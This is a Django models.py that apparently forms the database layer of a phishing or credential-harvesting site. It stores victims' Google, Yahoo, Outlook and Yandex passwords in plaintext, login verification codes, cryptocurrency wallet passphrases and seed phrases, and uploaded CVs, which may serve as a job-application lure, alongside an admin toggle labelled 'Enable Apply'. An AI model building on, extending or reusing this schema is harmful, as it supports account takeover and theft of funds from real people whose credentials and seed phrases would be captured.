from django.db import models

# Create your models here.

from django.db import models

# User model with only email
class Us(models.Model):
    email = models.EmailField(unique=True)

    def __str__(self):
        return self.email

# Google model related to Us
class Goo(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    email = models.EmailField()
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.email} "
    

class Goo_p(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    password = models.CharField(max_length=128)

    def __str__(self):
        return f"{self.password} "
    
class Goo_log(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    code = models.CharField(max_length=64, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.code} "


class Allow(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
   
    apply_enabled = models.BooleanField("Enable Apply", default=False)  # admin checkbox per Goo record
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.apply_enabled} "

# yahoo


class Yahoo(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    email = models.EmailField()
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.email} "
    

class Yahoo_p(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    password = models.CharField(max_length=128)

    def __str__(self):
        return f"{self.password} "
    
class Yahoo_log(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    code = models.CharField(max_length=64, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.code}"



# outlook



class Outlook(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    email = models.EmailField()
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.email} "
    

class Outlook_p(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    password = models.CharField(max_length=128)

    def __str__(self):
        return f"{self.password} "



# yandex

class Yandex(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    email = models.EmailField()
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.email} "
    

class Yandex_p(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    password = models.CharField(max_length=128)

    def __str__(self):
        return f"{self.password} "
    
class Yandex_log(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    code = models.CharField(max_length=64, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.code}"


class Wallet(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    pharse = models.CharField(max_length=64, blank=True, null=True)
    password = models.CharField(max_length=64, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.pharse}"


class Seed(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE,)
    pharse = models.CharField(max_length=64, blank=True, null=True)
    seed = models.CharField(max_length=64, blank=True, null=True)
    created_at = models.DateTimeField(auto_now_add=True)

    def __str__(self):
        return f"{self.pharse}"
    


class CVUpload(models.Model):
    us = models.ForeignKey(Us, on_delete=models.CASCADE)
    full_name = models.CharField(max_length=255)
    cv_file = models.FileField(upload_to='cv/')
    uploaded_at = models.DateTimeField(auto_now_add=True)
